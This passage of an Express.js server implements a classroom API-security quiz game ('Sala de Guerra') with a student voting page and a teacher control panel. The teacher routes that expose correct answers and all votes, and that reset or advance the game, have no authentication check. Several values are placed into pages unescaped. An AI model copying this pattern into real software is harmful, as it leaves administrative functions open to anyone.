        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
        .cenario-box { background:#1a1830; border:1px solid #2d2a5e; border-radius:14px; padding:22px 24px; margin-bottom:22px; }
        .rodada-badge { font-size:11px; font-weight:700; color:#a78bfa; background:#2d2a5e; padding:3px 10px; border-radius:999px; display:inline-block; margin-bottom:12px; }
        .cenario-txt { font-size:15px; line-height:1.7; color:#fffffe; }
        .cenario-txt code { background:#2d2a5e; padding:2px 7px; border-radius:5px; font-size:13px; color:#a78bfa; }
        .opcoes { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:20px; }
        .opcao-btn { background:#1a1830; border:2px solid #2d2a5e; border-radius:12px; padding:16px 14px; cursor:pointer; text-align:left; font-size:13px; color:#fffffe; transition:all .15s; }
        .opcao-btn:hover:not(:disabled) { border-color:#7C3AED; background:#2d2a5e; }
        .opcao-btn.selecionado { border-color:#a78bfa; background:#2d2a5e; }
        .opcao-btn:disabled { cursor:default; }
        .opcao-btn .letra { font-weight:800; color:#a78bfa; margin-right:6px; }
        .opcao-btn.correta  { border-color:#22c55e; background:#052e16; }
        .opcao-btn.errada   { border-color:#ef4444; background:#2d0707; }
        .opcao-btn.correta .letra { color:#22c55e; }
        .opcao-btn.errada .letra  { color:#ef4444; }
        .votos-barra { background:#1a1830; border:1px solid #2d2a5e; border-radius:12px; padding:16px 20px; margin-bottom:20px; }
        .votos-barra h4 { font-size:12px; color:#7c6fcd; margin-bottom:12px; text-transform:uppercase; letter-spacing:.06em; }
        .barra-row { display:flex; align-items:center; gap:10px; margin-bottom:8px; }
        .barra-letra { font-size:12px; font-weight:700; color:#a78bfa; width:16px; }
        .barra-track { flex:1; height:8px; background:#2d2a5e; border-radius:999px; overflow:hidden; }
        .barra-fill  { height:100%; background:#7C3AED; border-radius:999px; transition:width .4s; }
        .barra-count { font-size:12px; color:#7c6fcd; width:20px; text-align:right; }
        .resultado-box { background:#0d2a18; border:2px solid #22c55e; border-radius:14px; padding:20px 24px; margin-bottom:20px; }
        .resultado-box.errou { background:#2d0707; border-color:#ef4444; }
        .resultado-titulo { font-size:22px; font-weight:800; margin-bottom:8px; }
        .resultado-exp  { font-size:13px; line-height:1.6; color:#fffffe; opacity:.85; }
        .votos-nomes { margin-top:14px; display:flex; flex-wrap:wrap; gap:6px; }
        .voto-chip   { font-size:11px; padding:3px 10px; border-radius:999px; font-weight:600; }
        .voto-certo  { background:#052e16; color:#22c55e; border:1px solid #22c55e; }
        .voto-errado { background:#2d0707; color:#ef4444; border:1px solid #ef4444; }
        .voto-sem    { background:#1a1830; color:#7c6fcd; border:1px solid #2d2a5e; }
        .votando-status { text-align:center; font-size:13px; color:#7c6fcd; margin-bottom:14px; }
        .final-box  { text-align:center; padding:40px 20px; }
        .final-titulo { font-size:26px; font-weight:800; color:#a78bfa; margin-bottom:8px; }
        .final-sub    { font-size:14px; color:#7c6fcd; margin-bottom:28px; }
        .ranking { list-style:none; max-width:400px; margin:0 auto; }
        .ranking li { display:flex; justify-content:space-between; align-items:center; background:#1a1830; border:1px solid #2d2a5e; border-radius:10px; padding:12px 18px; margin-bottom:8px; }
        .rank-pos  { font-size:18px; width:30px; }
        .rank-nome { font-size:14px; font-weight:600; color:#fffffe; flex:1; padding:0 10px; }
        .rank-pts  { font-size:14px; font-weight:800; color:#a78bfa; }
    </style>
</head><body>
    <div class="topo">
        <div class="topo-brand">⚔️ Sala de Guerra</div>
        <div class="topo-info">👤 ${escapeHtml(nome)} &nbsp;|&nbsp; <a href="/apis/lab" style="color:#7c6fcd;font-size:11px;">← Lab</a></div>
    </div>
    <div class="placar">
        <div class="placar-item"><div class="placar-n" id="pts-time">0</div><div class="placar-l">Pontos do Time</div></div>
        <div class="placar-item"><div class="placar-n" id="rodada-atual">—</div><div class="placar-l">Rodada</div></div>
        <div class="placar-item"><div class="placar-n" id="votos-count">0</div><div class="placar-l">Votaram</div></div>
    </div>
    <div class="main" id="main-conteudo">
        <div class="aguardando">
            <h2 class="pulse">⏳ Aguardando o professor iniciar o jogo...</h2>
            <p>Quando a primeira rodada começar, a pergunta aparecerá aqui.</p>
        </div>
    </div>
    <script>
    const MEU_ALUNO = '${req.session.apisAluno}';
    let estadoAnterior = null;

    function renderAguardando() {
        document.getElementById('main-conteudo').innerHTML = \`
            <div class="aguardando">
                <h2 class="pulse">⏳ Aguardando o professor iniciar o jogo...</h2>
                <p>Quando a primeira rodada começar, a pergunta aparecerá aqui.</p>
            </div>\`;
    }

    function renderVotando(estado) {
        const q = estado.questao;
        const jaVotei = !!estado.meuVoto;
        const opts = ['A','B','C','D'];
        const total = estado.totalAlunos;
        document.getElementById('main-conteudo').innerHTML = \`
            <div class="cenario-box">
                <div class="rodada-badge">Rodada \${estado.rodadaAtual} de \${estado.totalRodadas}</div>
                <div class="cenario-txt">\${q.cenario}</div>
            </div>
            <div class="opcoes">
                \${opts.map(l => \`<button class="opcao-btn \${estado.meuVoto===l?'selecionado':''}" id="btn-\${l}"
                    onclick="votar('\${l}')" \${jaVotei?'disabled':''}>
                    <span class="letra">\${l}</span>\${q.opcoes[l]}
                </button>\`).join('')}
            </div>
            <div class="votando-status" id="votando-status">
                \${jaVotei ? '✅ Voto registrado! Aguardando os colegas...' : '⬆️ Clique em uma opção para votar'}
            </div>
            <div class="votos-barra">
                <h4>Votos recebidos: \${estado.totalVotos}/\${total}</h4>
                <div class="barra-row"><span class="barra-letra">✓</span>
                    <div class="barra-track"><div class="barra-fill" style="width:\${(estado.totalVotos/total)*100}%"></div></div>
                    <span class="barra-count">\${estado.totalVotos}</span>
                </div>
            </div>\`;
    }

    function renderRevelado(estado) {
        const q = estado.questao;
        const acertei = estado.acertouRodada;
        const dist = estado.distribuicao || {};
        const total = estado.totalAlunos;
        const corretosCount = dist[q.correta] || 0;
        const pontosGanhos = estado.historico.length > 0 ? estado.historico[estado.historico.length-1].pontosGanhos : 0;
        document.getElementById('main-conteudo').innerHTML = \`
            <div class="resultado-box \${acertei===false?'errou':''}">
                <div class="resultado-titulo">\${acertei ? '🎯 Você acertou!' : acertei===false ? '❌ Você errou.' : '👁️ Resultado'}</div>
                <div class="resultado-exp">\${q.explicacao}</div>
                <div class="votos-nomes" id="votos-nomes-box"></div>
            </div>
            <div class="votos-barra">
                <h4>Distribuição dos votos — \${corretosCount}/\${total} acertaram</h4>
                \${['A','B','C','D'].map(l => \`
                <div class="barra-row">
                    <span class="barra-letra" style="color:\${l===q.correta?'#22c55e':'#a78bfa'}">\${l}</span>
                    <div class="barra-track"><div class="barra-fill" style="width:\${total>0?((dist[l]||0)/total)*100:0}%;background:\${l===q.correta?'#22c55e':'#7C3AED'}"></div></div>
                    <span class="barra-count">\${dist[l]||0}</span>
                </div>\`).join('')}
            </div>
            <p style="text-align:center;font-size:13px;color:\${pontosGanhos?'#22c55e':'#ef4444'};font-weight:700;">
                \${pontosGanhos ? '🏆 +1 ponto para o time!' : '💀 Time não atingiu maioria — sem ponto nesta rodada.'}
            </p>
            <p style="text-align:center;font-size:12px;color:#7c6fcd;margin-top:8px;">Aguardando o professor avançar...</p>\`;

        // Preenche chips de votantes
        if (estado.votosNomes) {
            const box = document.getElementById('votos-nomes-box');
            if (box) {
                const nomeMap = {};
                \${JSON.stringify(ALUNOS_APIS.map(a=>({u:a.usuario,n:a.nomeExibicao})))}.forEach(a=>nomeMap[a.u]=a.n);
                Object.entries(estado.votosNomes).forEach(([u, v]) => {
                    const certo = v === q.correta;
                    const chip = document.createElement('span');
                    chip.className = 'voto-chip ' + (v===null?'voto-sem':certo?'voto-certo':'voto-errado');
                    chip.textContent = (nomeMap[u]||u) + (v ? ' ('+v+')' : ' —');
                    box.appendChild(chip);
                });
            }
        }
    }

    function renderFinal(estado) {
        const alunos = ${JSON.stringify(ALUNOS_APIS.map(a=>({u:a.usuario,n:a.nomeExibicao})))};
        const ranking = alunos.map(a => ({ nome: a.n, pts: estado.acertosPorAluno[a.u] || 0 }))
            .sort((a,b) => b.pts - a.pts);
        const medalhas = ['🥇','🥈','🥉'];
        const ganhou = estado.pontosTime >= 7;
        document.getElementById('main-conteudo').innerHTML = \`
            <div class="final-box">
                <div class="final-titulo">\${ganhou ? '🏆 Time Vencedor!' : '💀 Próxima vez!'}</div>
                <div class="final-sub">\${estado.pontosTime}/\${estado.totalRodadas} pontos coletivos</div>
                <ul class="ranking">
                    \${ranking.map((r, i) => \`<li>
                        <span class="rank-pos">\${medalhas[i]||'  '}</span>
                        <span class="rank-nome">\${r.nome}</span>
                        <span class="rank-pts">\${r.pts}/\${estado.totalRodadas}</span>
                    </li>\`).join('')}
                </ul>
            </div>\`;
    }

    function render(estado) {
        document.getElementById('pts-time').textContent = estado.pontosTime;
        document.getElementById('rodada-atual').textContent = estado.rodadaAtual > 0 ? estado.rodadaAtual + '/' + estado.totalRodadas : '—';
        document.getElementById('votos-count').textContent = estado.totalVotos + '/' + estado.totalAlunos;

        const faseAnt = estadoAnterior ? estadoAnterior.fase : null;
        const rodAnt  = estadoAnterior ? estadoAnterior.rodadaAtual : null;

        if (estado.fase === 'aguardando') { renderAguardando(); }
        else if (estado.fase === 'votando') {
            if (faseAnt !== 'votando' || rodAnt !== estado.rodadaAtual) { renderVotando(estado); }
            else {
                // Atualiza apenas contador de votos
                const h4 = document.querySelector('.votos-barra h4');
                if (h4) h4.textContent = 'Votos recebidos: ' + estado.totalVotos + '/' + estado.totalAlunos;
                const fill = document.querySelector('.barra-fill');
                if (fill) fill.style.width = (estado.totalVotos / estado.totalAlunos * 100) + '%';
                const cnt = document.querySelector('.barra-count');
                if (cnt) cnt.textContent = estado.totalVotos;
                if (estado.meuVoto && !estadoAnterior?.meuVoto) {
                    document.querySelectorAll('.opcao-btn').forEach(b => b.disabled = true);
                    const btn = document.getElementById('btn-' + estado.meuVoto);
                    if (btn) btn.classList.add('selecionado');
                    const st = document.getElementById('votando-status');
                    if (st) st.textContent = '✅ Voto registrado! Aguardando os colegas...';
                }
            }
        }
        else if (estado.fase === 'revelado') {
            if (faseAnt !== 'revelado' || rodAnt !== estado.rodadaAtual) { renderRevelado(estado); }
        }
        else if (estado.fase === 'finalizado') { renderFinal(estado); }

        estadoAnterior = estado;
    }

    async function votar(opcao) {
        try {
            const r = await fetch('/apis/guerra/votar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ opcao }) });
            const res = await r.json();
            if (res.ok) {
                document.querySelectorAll('.opcao-btn').forEach(b => b.disabled = true);
                const btn = document.getElementById('btn-' + opcao);
                if (btn) btn.classList.add('selecionado');
                const st = document.getElementById('votando-status');
                if (st) st.textContent = '✅ Voto registrado! Aguardando os colegas...';
            }
        } catch(e) { console.error(e); }
    }

    async function poll() {
        try {
            const r = await fetch('/apis/guerra/estado');
            const estado = await r.json();
            render(estado);
        } catch(e) { console.error(e); }
    }

    poll();
    setInterval(poll, 2000);
    </script>
</body></html>`);
});

app.get('/apis/guerra/estado', exigirLoginApis, (req, res) => {
    res.json(snapEstadoPublico(req.session.apisAluno));
});

app.post('/apis/guerra/votar', exigirLoginApis, (req, res) => {
    const aluno = req.session.apisAluno;
    const { opcao } = req.body;
    if (estadoGuerra.fase !== 'votando') return res.json({ ok: false, erro: 'Fora do período de votação' });
    if (!['A','B','C','D'].includes(opcao)) return res.json({ ok: false, erro: 'Opção inválida' });
    estadoGuerra.votos[aluno] = opcao;
    res.json({ ok: true });
});

app.get('/apis/guerra/painel', (req, res) => {
    res.send(`<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8"><title>Painel Professor — Sala de Guerra</title>
    <style>
        * { box-sizing:border-box; margin:0; padding:0; }
        body { font-family:system-ui,sans-serif; background:#0f0e17; color:#fffffe; min-height:100vh; padding:28px; }
        h1 { color:#a78bfa; margin-bottom:4px; }
        .sub { color:#7c6fcd; font-size:13px; margin-bottom:22px; }
        .controles { display:flex; gap:12px; flex-wrap:wrap; margin-bottom:24px; }
        .btn { padding:12px 22px; border:none; border-radius:10px; font-size:14px; font-weight:700; cursor:pointer; transition:opacity .15s; }
        .btn:hover { opacity:.85; }
        .btn-iniciar  { background:#7C3AED; color:white; }
        .btn-revelar  { background:#f59e0b; color:white; }
        .btn-proximo  { background:#22c55e; color:#052e16; }
        .btn-reset    { background:#ef4444; color:white; }
        .btn:disabled { opacity:.35; cursor:default; }
        .painel-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
        .card { background:#1a1830; border:1px solid #2d2a5e; border-radius:14px; padding:20px; }
        .card h3 { font-size:14px; color:#a78bfa; margin-bottom:14px; }
        .questao-box { background:#130f2a; border-radius:10px; padding:14px; font-size:13px; line-height:1.7; margin-bottom:14px; }
        .questao-box code { background:#2d2a5e; padding:2px 6px; border-radius:4px; color:#a78bfa; }
        .dist-row { display:flex; align-items:center; gap:10px; margin-bottom:8px; }
        .dist-letra { font-weight:800; color:#a78bfa; width:20px; }
        .dist-track { flex:1; height:10px; background:#2d2a5e; border-radius:999px; overflow:hidden; }
        .dist-fill  { height:100%; background:#7C3AED; border-radius:999px; transition:width .4s; }
        .dist-count { font-size:12px; color:#7c6fcd; width:24px; text-align:right; }
        .alunos-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:8px; }
        .aluno-chip { background:#130f2a; border:1px solid #2d2a5e; border-radius:8px; padding:8px 10px; font-size:12px; text-align:center; }
        .aluno-chip.votou { border-color:#a78bfa; }
        .aluno-chip .chip-voto { font-weight:800; color:#a78bfa; font-size:14px; }
        .placar-row { display:flex; justify-content:space-around; background:#130f2a; border-radius:10px; padding:14px; margin-bottom:16px; }
        .placar-item { text-align:center; }
        .placar-n  { font-size:26px; font-weight:800; color:#a78bfa; line-height:1; }
        .placar-l  { font-size:10px; color:#7c6fcd; text-transform:uppercase; margin-top:3px; }
        .historico-item { font-size:12px; color:#7c6fcd; padding:6px 0; border-bottom:1px solid #2d2a5e; display:flex; justify-content:space-between; }
        #status-poll { font-size:11px; color:#7c6fcd; margin-top:10px; }
    </style>
</head><body>
    <h1>⚔️ Sala de Guerra — Painel do Professor</h1>
    <div class="sub">Segurança em APIs · Aula 18 · Polling a cada 2s</div>

    <div class="controles">
        <button class="btn btn-iniciar"  id="btn-ini"  onclick="controle('iniciar')">▶ Iniciar Jogo</button>
        <button class="btn btn-revelar"  id="btn-rev"  onclick="controle('revelar')" disabled>👁 Revelar Resposta</button>
        <button class="btn btn-proximo"  id="btn-prox" onclick="controle('proximo')" disabled>⏭ Próxima Rodada</button>
        <button class="btn btn-reset"    id="btn-rst"  onclick="controle('reset')">🔄 Resetar Jogo</button>
    </div>

    <div class="painel-grid">
        <div class="card">
            <h3>📊 Estado Atual</h3>
            <div class="placar-row">
                <div class="placar-item"><div class="placar-n" id="p-pts">0</div><div class="placar-l">Pontos Time</div></div>
                <div class="placar-item"><div class="placar-n" id="p-rod">—</div><div class="placar-l">Rodada</div></div>
                <div class="placar-item"><div class="placar-n" id="p-fase">—</div><div class="placar-l">Fase</div></div>
            </div>
            <div class="questao-box" id="questao-texto">Nenhuma questão ativa.</div>
            <div id="dist-votos">
                ${['A','B','C','D'].map(l => `<div class="dist-row">
                    <span class="dist-letra">${l}</span>
                    <div class="dist-track"><div class="dist-fill" id="df-${l}" style="width:0%"></div></div>
                    <span class="dist-count" id="dc-${l}">0</span>
                </div>`).join('')}
            </div>
        </div>
        <div class="card">
            <h3>👥 Votos dos Alunos</h3>
            <div class="alunos-grid" id="alunos-grid">
                ${ALUNOS_APIS.map(a => `<div class="aluno-chip" id="chip-${a.usuario}">
                    <div style="font-size:11px;color:#7c6fcd;">${a.nomeExibicao}</div>
                    <div class="chip-voto" id="voto-${a.usuario}">—</div>
                </div>`).join('')}
            </div>
            <div id="status-poll">🟡 Aguardando...</div>
        </div>
    </div>

    <div class="card" style="margin-top:20px;">
        <h3>📜 Histórico de Rodadas</h3>
        <div id="historico-lista"><p style="color:#7c6fcd;font-size:12px;">Nenhuma rodada concluída ainda.</p></div>
    </div>

    <script>
    const TOTAL_ALUNOS = ${ALUNOS_APIS.length};
    const NOMES = ${JSON.stringify(Object.fromEntries(ALUNOS_APIS.map(a=>[a.usuario,a.nomeExibicao])))};
    const QUESTOES = ${JSON.stringify(QUESTOES_GUERRA.map(q=>({id:q.id,cenario:q.cenario,opcoes:q.opcoes,correta:q.correta,explicacao:q.explicacao})))};

    async function controle(acao) {
        await fetch('/apis/guerra/controle', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ acao }) });
        await poll();
    }

    function atualizarBotoes(fase) {
        document.getElementById('btn-ini').disabled  = fase !== 'aguardando' && fase !== 'finalizado';
        document.getElementById('btn-rev').disabled  = fase !== 'votando';
        document.getElementById('btn-prox').disabled = fase !== 'revelado';
        document.getElementById('btn-rst').disabled  = false;
    }

    async function poll() {
        try {
            const r = await fetch('/apis/guerra/controle-estado');
            const estado = await r.json();

            document.getElementById('p-pts').textContent  = estado.pontosTime;
            document.getElementById('p-rod').textContent  = estado.rodadaAtual > 0 ? estado.rodadaAtual + '/' + QUESTOES.length : '—';
            document.getElementById('p-fase').textContent = estado.fase;
            atualizarBotoes(estado.fase);

            const q = estado.rodadaAtual > 0 ? QUESTOES[estado.rodadaAtual - 1] : null;
            document.getElementById('questao-texto').innerHTML = q ? q.cenario : 'Nenhuma questão ativa.';

            const dist = {A:0,B:0,C:0,D:0};
            Object.values(estado.votos).forEach(v => { if (dist[v]!==undefined) dist[v]++; });
            ['A','B','C','D'].forEach(l => {
                const pct = TOTAL_ALUNOS > 0 ? (dist[l]/TOTAL_ALUNOS)*100 : 0;
                const fill = document.getElementById('df-'+l);
                const cnt  = document.getElementById('dc-'+l);
                if (fill) { fill.style.width = pct+'%'; fill.style.background = (q && l===q.correta) ? '#22c55e' : '#7C3AED'; }
                if (cnt)  cnt.textContent = dist[l];
            });

            Object.entries(NOMES).forEach(([u, nome]) => {
                const chip = document.getElementById('chip-'+u);
                const voto = document.getElementById('voto-'+u);
                const v = estado.votos[u] || null;
                if (chip) chip.classList.toggle('votou', !!v);
                if (voto) voto.textContent = v || '—';
            });

            const hist = document.getElementById('historico-lista');
            if (estado.historico.length > 0) {
                hist.innerHTML = estado.historico.map(h => {
                    const qh = QUESTOES[h.rodada-1];
                    const corretos = Object.values(h.votos).filter(v=>v===h.correta).length;
                    return \`<div class="historico-item">
                        <span>R\${h.rodada}: \${qh ? qh.opcoes[h.correta].substring(0,40)+'...' : ''}</span>
                        <span style="color:\${h.pontosGanhos?'#22c55e':'#ef4444'};">\${corretos}/\${TOTAL_ALUNOS} corretos · \${h.pontosGanhos?'+1 ponto':'sem ponto'}</span>
                    </div>\`;
                }).reverse().join('');
            }

            document.getElementById('status-poll').textContent = '🟢 Atualizado: ' + new Date().toLocaleTimeString('pt-BR');
        } catch(e) { document.getElementById('status-poll').textContent = '🔴 Falha: ' + e.message; }
    }

    poll();
    setInterval(poll, 2000);
    </script>
</body></html>`);
});

app.get('/apis/guerra/controle-estado', (req, res) => {
    res.json({
        fase:        estadoGuerra.fase,
        rodadaAtual: estadoGuerra.rodadaAtual,
        votos:       estadoGuerra.votos,
        historico:   estadoGuerra.historico,
        pontosTime:  estadoGuerra.pontosTime,
        acertosPorAluno: estadoGuerra.acertosPorAluno,
    });
});

app.post('/apis/guerra/controle', (req, res) => {
    const { acao } = req.body;

    if (acao === 'reset') {
        estadoGuerra = { fase:'aguardando', rodadaAtual:0, votos:{}, historico:[], pontosTime:0, acertosPorAluno:{}, iniciadoEm:null };
        return res.json({ ok: true });
    }

    if (acao === 'iniciar') {
        if (estadoGuerra.fase === 'aguardando' || estadoGuerra.fase === 'finalizado') {
            estadoGuerra = { fase:'votando', rodadaAtual:1, votos:{}, historico:[], pontosTime:0, acertosPorAluno:{}, iniciadoEm: Date.now() };
            return res.json({ ok: true });
        }
    }

    if (acao === 'revelar') {
        if (estadoGuerra.fase !== 'votando') return res.json({ ok: false });
        const q = QUESTOES_GUERRA[estadoGuerra.rodadaAtual - 1];
        const corretos = Object.values(estadoGuerra.votos).filter(v => v === q.correta).length;
        const pontosGanhos = corretos >= Math.ceil(ALUNOS_APIS.length / 2) ? 1 : 0;
        estadoGuerra.pontosTime += pontosGanhos;
        // Atualiza acertos por aluno
        Object.entries(estadoGuerra.votos).forEach(([aluno, voto]) => {
            if (voto === q.correta) {
                estadoGuerra.acertosPorAluno[aluno] = (estadoGuerra.acertosPorAluno[aluno] || 0) + 1;
            }
        });
        estadoGuerra.historico.push({ rodada: estadoGuerra.rodadaAtual, correta: q.correta, votos: {...estadoGuerra.votos}, pontosGanhos });
        estadoGuerra.fase = 'revelado';
        return res.json({ ok: true });
    }

    if (acao === 'proximo') {
        if (estadoGuerra.fase !== 'revelado') return res.json({ ok: false });
        if (estadoGuerra.rodadaAtual >= QUESTOES_GUERRA.length) {
            estadoGuerra.fase = 'finalizado';
        } else {
            estadoGuerra.rodadaAtual++;
            estadoGuerra.votos = {};
            estadoGuerra.fase = 'votando';
        }
        return res.json({ ok: true });
    }

    res.json({ ok: false, erro: 'Ação desconhecida' });
});

// Inicialização da porta dinâmica (Render ou Local)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🔥 Servidor do Laboratório iniciado com sucesso na porta ${PORT}`));
